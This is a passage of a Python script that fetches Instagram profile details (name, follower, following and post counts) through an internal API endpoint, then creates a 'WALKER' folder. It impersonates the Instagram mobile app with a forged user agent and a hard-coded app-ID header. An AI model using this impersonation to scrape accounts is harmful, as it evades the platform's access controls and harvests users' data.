    ua = 'Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)'
    try:
        dt = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}', headers={'user-agent': ua, 'x-ig-app-id': '936619743392459'}).json()['data']['user']
    except:
        dt = ''

    try:
        na = dt['full_name']
    except:
        na = '-'

    try:
        pg = dt['edge_followed_by']['count']
    except:
        pg = '0'

    try:
        mg = dt['edge_follow']['count']
    except:
        mg = '0'

    try:
        ps = dt['edge_owner_to_timeline_media']['count']
    except:
        ps = '0'

    return (na, pg, mg, ps)

def makedirectory():

    try:
        os.mkdir('WALKER')
    except:
        pass

    back()

if __name__ == '__main__':
    makedirectory()
